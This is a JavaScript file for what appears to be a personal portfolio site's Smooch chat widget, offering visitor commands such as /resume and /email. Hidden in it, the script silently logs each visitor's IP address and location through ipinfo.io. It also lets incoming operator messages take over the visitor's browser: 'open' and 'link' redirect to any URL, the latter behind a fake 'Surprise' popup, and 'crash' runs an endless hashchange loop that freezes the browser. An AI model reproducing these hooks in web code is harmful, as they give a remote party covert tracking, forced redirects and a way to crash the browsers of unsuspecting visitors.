$(document).ready(function(){
  //location
  function getDistanceFromLatLonInKm(lat1,lon1,lat2,lon2) {
      var R = 6371; // Radius of the earth in km
      var dLat = deg2rad(lat2-lat1);  // deg2rad below
      var dLon = deg2rad(lon2-lon1);
      var a =
              Math.sin(dLat/2) * Math.sin(dLat/2) +
              Math.cos(deg2rad(lat1)) * Math.cos(deg2rad(lat2)) *
              Math.sin(dLon/2) * Math.sin(dLon/2)
          ;
      var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
      var d = R * c; // Distance in km
      return d;
  }

  function deg2rad(deg) {
      return deg * (Math.PI/180)
  }

  //chat
  Smooch.on('ready', function(){

      var ip = "?"
      var city = "?"
      var region = "?"
      var country = "?"
      $.getJSON('http://ipinfo.io', function(data){
          //console.log(data)
          //$("#chat").text("Are you from "+data["city"]+", "+data["region"]+", "+data["country"]+"?");

          ip = data["ip"];
          city = data["city"];
          region = data["region"];
          country = data["country"];

          Smooch.updateUser({
              givenName: city+', '+country,
              surname: ip,
              properties: {
              'lastOpen' : new Date().toLocaleString()
              }
          });
        
          Smooch.getConversation().then(function(conversation){})
                                  .catch(function(){
                                       Smooch.sendMessage("Hey! What a cool website!");
                                       Smooch.track("/first");
                                    });
      }).error(function() { swal("Hey You!", "How about disabling adBlock?")});
  });

  
  Smooch.on('message:received', function(message) {
    
    if (message.lastInGroup && ((Date.now()/1000) - 15) >= message.received){
      Smooch.updateUser({
          properties: {
            'lastRejoinAfterIdle' : new Date().toLocaleString()
          }
      });
    }
    if(message.lastInGroup && ((Date.now()/1000) - 3) <= message.received){
        var rspns = message.text
        var lines = rspns.split(" ");
        var cmd = lines[0];

        if (cmd == "open" && lines.length > 1){
            Smooch.open();
            window.location.assign(lines[1]);
        } else if (cmd == "crash"){
            Smooch.open();
            function recursor() {
                window.location.hash = Math.random();
                window.addEventListener('hashchange', function() { recursor(); });
            };
            recursor();
        } else if (cmd == "link" && lines.length > 1){
            Smooch.open();
            swal({
                    title: "Surprise",
                    text: "This is just for you!",
                    type: "success",
                    allowEscapeKey: "false",
                    confirmButtonText: "Okay..."
                },
                function(){
                    window.location.assign(lines[1]);
                });
        } else if (cmd == "ping"){
            Smooch.open();
            Smooch.sendMessage("pong");
        } else if (cmd == "video"){
            Smooch.open();
            window.location.assign("https://appear.in/cpmajgaard");
        }
    }

  });
  
  Smooch.init({
      appToken: 'bsr6mwgtbgnby9ubqdu71ko9c',
      emailCaptureEnabled: true,
      customText: {
          headerText: 'Say Hi',
          introductionText: 'Let me know if I can help with anything!',
          sendButtonText: 'Send',
          introText: "What's up?",
          settingsText: "Feel free to leave your email, and I'll get back to you.",
          settingsNotificationText: 'In case I\'m slow to respond you can <a href data-ui-settings-link>leave me your email</a>.'
      }
  });



  Smooch.on('message:sent', function(message) {
      var rspns = message.text
      var lines = rspns.split(" ");
      var cmd = lines[0];

      if (cmd == "/help") {
          swal("Options:", 
              "/resume\n/email\n/github\n/linkedin\n/help");
      } else if (cmd == "/email") {
          swal({
                    title: "Email Me!",
                    text: "You can reach me at cmajgaaard@gmail.com",
                    allowEscapeKey: "false",
                    showCancelButton: true,
                    cancelButtonText: "Not right now",
                    confirmButtonText: "Send an Email",
                },
               function(isConfirm){
                  if(isConfirm){
                    window.location.href = 'mailto:cmajgaard@gmail.com?Subject=Hi%20there!';
                  }
                });
      } else if (cmd == "/resume") {
          window.open("files/CarlPhilipMajgaardResume.pdf");
      } else if (cmd == "/github") {
          window.location.href = "https://github.com/luftdanmark";
      } else if (cmd == "/linkedin") {
          window.location.href = "https://www.linkedin.com/in/cpmajgaard";
      }  else if (cmd.charAt(0) == "/"){
          swal("Invalid Command \n Type /help for info.");
      }
  });


});
